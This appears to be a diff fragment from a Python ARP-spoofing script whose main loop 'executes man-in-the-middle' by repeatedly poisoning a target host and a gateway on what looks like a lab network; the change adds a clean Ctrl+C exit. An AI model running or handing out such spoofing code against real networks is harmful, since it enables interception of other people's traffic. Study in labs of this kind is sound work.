@@ -24,15 +24,16 @@ def spoof(target_ip, spoof_ip):
 
 def main(target_ip, spoof_ip):  # executes man-in-the-middle
     packet_counter = 0
-    while True:
-        spoof(target_ip, spoof_ip)
-        spoof(spoof_ip, target_ip)
-        packet_counter += 2
-        print("\r[+] Packets sent: " + str(packet_counter)),
-        sys.stdout.flush()
-
-        # print("\r[+] Packets sent: " + str(packet_counter), end="") PYTHON 3 version
-        time.sleep(2)
-
+    try:
+        while True:
+            spoof(target_ip, spoof_ip)
+            spoof(spoof_ip, target_ip)
+            packet_counter += 2
+            print("\r[+] Packets sent: " + str(packet_counter)),
+            sys.stdout.flush()
+            # print("\r[+] Packets sent: " + str(packet_counter), end="") PYTHON 3 version
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[+] Detected CTRL + C. Quitting.")
 
 main("10.0.2.15", "10.0.2.1")
